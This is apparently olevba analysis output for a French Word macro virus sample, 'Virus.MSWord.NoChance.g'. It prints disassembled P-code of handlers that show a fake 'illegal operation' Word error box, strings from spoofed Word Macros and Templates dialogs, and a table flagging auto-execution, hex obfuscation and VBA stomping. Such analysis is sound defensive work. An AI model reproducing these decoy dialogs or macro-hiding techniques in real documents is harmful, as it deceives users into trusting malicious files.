' 	FuncDefn (Private Sub CommandButton3_Click())
' Line #46:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #47:
' 	Ld UserForm999 
' 	ArgsCall Unlock 0x0001 
' Line #48:
' 	EndSub 
' Line #49:
' Line #50:
' 	FuncDefn (Private Sub CommandButton4_Click())
' Line #51:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #52:
' 	Ld UserForm999 
' 	ArgsCall Unlock 0x0001 
' Line #53:
' 	EndSub 
' Line #54:
' Line #55:
' 	FuncDefn (Private Sub CommandButton5_Click())
' Line #56:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #57:
' 	Ld UserForm999 
' 	ArgsCall Unlock 0x0001 
' Line #58:
' 	EndSub 
' Line #59:
' Line #60:
' 	FuncDefn (Private Sub CommandButton6_Click())
' Line #61:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #62:
' 	Ld UserForm999 
' 	ArgsCall Unlock 0x0001 
' Line #63:
' 	EndSub 
' Line #64:
' Line #65:
' 	FuncDefn (Private Sub CommandButton7_Click())
' Line #66:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #67:
' 	Ld UserForm999 
' 	ArgsCall Unlock 0x0001 
' Line #68:
' 	EndSub 
' Line #69:
' 	FuncDefn (Private Sub ScrollBar1_Change())
' Line #70:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #71:
' 	Ld UserForm999 
' 	ArgsCall Unlock 0x0001 
' Line #72:
' 	EndSub 
' Line #73:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Mod�le de document
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Mise � jour automatique des styles de document
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Mod�les globaux et compl�ments
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Les �l�ments coch�s sont d�j� en m�moire.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Attacher....D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ajouter
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Supprimer...E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Organiser...E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Annuler
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Chemin d'acc�s:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�,? 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tous les mod�les actifs
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Nom de la macro:0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Macros disponibles dans::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Description:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ex�cuter
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Annuler
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ex�cuter pas � pas
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Modifier
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Cr�er
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Supprimer
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Organiser...
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ScrollBar1'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ScrollBar1'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'Tous les mod\xe8les actifs'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox2'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton7'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.NoChance.g' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |ScrollBar1_Change   |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

